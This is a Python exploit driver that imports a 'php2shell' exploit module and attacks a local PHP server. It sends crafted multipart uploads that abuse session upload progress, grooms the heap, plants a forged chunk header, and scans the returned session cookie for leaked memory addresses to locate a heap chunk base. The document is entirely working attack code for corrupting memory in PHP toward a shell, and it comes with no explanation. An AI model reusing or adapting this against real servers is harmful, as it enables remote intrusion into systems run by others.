import importlib.util, struct, sys, time, collections
spec = importlib.util.spec_from_file_location("p2s", "../php2shell-9bie/exploit.py")
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
t = m.Target("http://127.0.0.1:8088/index.php", timeout=90, verbose=False)

parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [{"name": "PHPSESSID", "data": b"\x00"},
          {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
          {"name": "f", "filename": "a.txt", "data": b"A"*64},
          {"name": "big", "data": b"B"*(12*1024*1024)}]
r1 = t.post(m.build_multipart(parts, b"S"*17), b"S"*17, read_cap=1<<20, timeout=90)
print("A status/len:", len(r1))
time.sleep(0.2)

parts2 = [{"name": "PHPSESSID", "data": m.SID},
          {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
for i in range(m.BOOKWORM_STAGE1_N):
    val = (f"v{i:04d}" + "x"*44)[:48]
    parts2.append({"name": str(1000+i), "data": val.encode()})
forge = bytearray(b"A"*79)
struct.pack_into("<Q", forge, 0x10, 0x1000)
forge[0x18] = ord("L")
parts2.append({"name": "1999", "data": bytes(forge)})
r2 = t.post(m.build_multipart(parts2, b"B"*10), b"B"*10, read_cap=9<<20)
print("B len:", len(r2))
print("headers:", r2.split(b"\r\n\r\n")[0][:300])
cookie = m.parse_cookie(r2)
print("cookie decoded len:", len(cookie))
c = collections.Counter()
for i in range(max(0, len(cookie)-8)):
    v = int.from_bytes(cookie[i:i+8], "little")
    if 0x7F0000000000 <= v < 0x800000000000:
        c[v & ~0x1FFFFF] += 1
print("chunk candidates:", c.most_common(3))
print("chunk_base_from_cookie:", hex(m.chunk_base_from_cookie(cookie)))
